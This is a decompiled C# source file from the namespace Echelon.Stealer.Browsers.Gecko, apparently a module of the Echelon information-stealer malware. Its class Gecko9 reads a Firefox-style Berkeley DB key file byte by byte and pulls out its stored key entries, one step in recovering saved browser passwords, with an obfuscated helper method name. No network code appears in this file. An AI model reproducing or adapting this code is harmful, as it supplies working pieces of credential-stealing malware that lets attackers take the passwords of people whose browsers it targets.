using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Echelon.Stealer.Browsers.Gecko
{
	// Token: 0x0200003B RID: 59
	public class Gecko9
	{
		// Token: 0x0600016A RID: 362 RVA: 0x0000B498 File Offset: 0x00009698
		public Gecko9(string FileName)
		{
			List<byte> list = new List<byte>();
			this.Keys = new List<KeyValuePair<string, string>>();
			using (BinaryReader binaryReader = new BinaryReader(File.OpenRead(FileName)))
			{
				int i = 0;
				int num = (int)binaryReader.BaseStream.Length;
				while (i < num)
				{
					list.Add(binaryReader.ReadByte());
					i++;
				}
			}
			string value = BitConverter.ToString(this.Txtnhfrn(list.ToArray(), 0, 4, false)).Replace("-", "");
			string text = BitConverter.ToString(this.Txtnhfrn(list.ToArray(), 4, 4, false)).Replace("-", "");
			int num2 = BitConverter.ToInt32(this.Txtnhfrn(list.ToArray(), 12, 4, true), 0);
			if (!string.IsNullOrEmpty(value))
			{
				this.Version = "Berkelet DB";
				if (text.Equals("00000002"))
				{
					this.Version += " 1.85 (Hash, version 2, native byte-order)";
				}
				int num3 = int.Parse(BitConverter.ToString(this.Txtnhfrn(list.ToArray(), 56, 4, false)).Replace("-", ""));
				int num4 = 1;
				while (this.Keys.Count < num3)
				{
					string[] array = new string[(num3 - this.Keys.Count) * 2];
					for (int j = 0; j < (num3 - this.Keys.Count) * 2; j++)
					{
						array[j] = BitConverter.ToString(this.Txtnhfrn(list.ToArray(), num2 * num4 + 2 + j * 2, 2, true)).Replace("-", "");
					}
					Array.Sort<string>(array);
					for (int k = 0; k < array.Length; k += 2)
					{
						int num5 = Convert.ToInt32(array[k], 16) + num2 * num4;
						int num6 = Convert.ToInt32(array[k + 1], 16) + num2 * num4;
						int num7 = (k + 2 >= array.Length) ? (num2 + num2 * num4) : (Convert.ToInt32(array[k + 2], 16) + num2 * num4);
						string @string = Encoding.ASCII.GetString(this.Txtnhfrn(list.ToArray(), num6, num7 - num6, false));
						string value2 = BitConverter.ToString(this.Txtnhfrn(list.ToArray(), num5, num6 - num5, false));
						if (!string.IsNullOrEmpty(@string))
						{
							this.Keys.Add(new KeyValuePair<string, string>(@string, value2));
						}
					}
					num4++;
				}
				return;
			}
			this.Version = "Unknow database format";
		}

		// Token: 0x17000033 RID: 51
		// (get) Token: 0x0600016B RID: 363 RVA: 0x0000B758 File Offset: 0x00009958
		// (set) Token: 0x0600016C RID: 364 RVA: 0x0000B760 File Offset: 0x00009960
		public string Version { get; set; }

		// Token: 0x17000034 RID: 52
		// (get) Token: 0x0600016D RID: 365 RVA: 0x0000B76C File Offset: 0x0000996C
		public List<KeyValuePair<string, string>> Keys { get; }

		// Token: 0x0600016E RID: 366 RVA: 0x0000B774 File Offset: 0x00009974
		private byte[] Txtnhfrn(byte[] source, int start, int length, bool littleEndian)
		{
			byte[] array = new byte[length];
			int num = 0;
			for (int i = start; i < start + length; i++)
			{
				array[num] = source[i];
				num++;
			}
			if (littleEndian)
			{
				Array.Reverse(array);
			}
			return array;
		}
	}
}
